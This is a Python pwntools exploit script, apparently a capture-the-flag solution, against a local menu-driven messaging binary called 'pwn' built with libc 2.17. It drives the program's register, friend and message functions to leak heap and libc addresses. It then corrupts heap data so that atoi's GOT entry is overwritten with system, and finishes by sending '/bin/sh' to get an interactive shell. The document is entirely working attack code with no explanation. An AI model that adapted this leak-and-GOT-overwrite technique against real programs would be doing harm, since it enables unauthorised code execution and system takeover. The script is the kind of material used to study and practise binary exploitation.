from pwn import *

elf=ELF('pwn')
libc=ELF('libc-2.17.so')
r=process('./pwn')

def login(name):
	r.sendlineafter('Your choice:','1')
	r.recvuntil('Please input your user name:')
	r.send(name)
def reg(size,name,age,description):
	r.sendlineafter('Your choice:','2')
	r.recvuntil('Input your name size:')
	r.send(str(size))
	r.recvuntil('Input your name:')
	r.send(name)
	r.recvuntil('Input your age:')
	r.send(str(age))
	r.recvuntil('Input your description:')
	r.send(description)

def viewProfile():
	r.sendlineafter('Your choice:','1')
def updateProfile(name,age,description):
	r.sendlineafter('Your choice:','2')
	r.recvuntil('Input your name:')
	r.send(name)
	r.recvuntil('Input your age:')
	r.send(str(age))
	r.recvuntil('Input your description:')
	r.send(description)
def addfriend(toname):
	r.sendlineafter('Your choice:','3')
	r.recvuntil('name:')
	r.send(toname)
	r.recvuntil('(a/d)')
	r.send('a')
def delfriend(toname):
	r.sendlineafter('Your choice:','3')
	r.recvuntil('name:')
	r.send(toname)
	r.recvuntil('(a/d)')
	r.send('d')
def sendMessage(toname,title,content):
	r.sendlineafter('Your choice:','4')
	r.recvuntil('Which user do you want to send a msg to:')
	r.send(toname)
	r.recvuntil('title:')
	r.send(title)
	r.recvuntil('content:')
	r.send(content)
def viewMessage(toname):
	r.sendlineafter('Your choice:','5')
def logout():
	r.sendlineafter('Your choice:','6')

reg(0x20,'0000',100,'0'*0x100)
reg(0x20,'1111',100,'1'*0x100)
reg(0x20,'2222',100,'2'*0x100)

login('0000')
addfriend('1111')
viewProfile()
r.recvuntil('0'*0x100)
heap_base=u64(r.recvuntil('\n').strip().ljust(8,'\x00'))-0x2640
log.success('heap_base='+str(hex(heap_base)))

delfriend('1111')#1111 freed and name=*(main_arena+88)
logout()
login(p64(heap_base+0x26f0))
viewProfile()
r.recvuntil('Age:')
libc_base=int(r.recvline().strip(),16)-(libc.symbols['main_arena']+88)
log.success('libc_base='+str(hex(libc_base)))
logout()

login('0000')
sendMessage('2222','3333','xxxx')
logout()
login('3333')
updateProfile('3333',0x20,p64(0x0)*2+'3333'+'\x00'*4+p64(0x0)*6+p64(0x110))
logout()
login('0000')
sendMessage('2222','1'*0xb0+p64(0x602060),'yyyy')
logout()
login(p64(libc_base+libc.symbols['atoi']))
updateProfile(p64(libc_base+libc.symbols['system']),0x20,'zzzzzzzz')
r.sendline('/bin/sh\x00')
r.interactive()


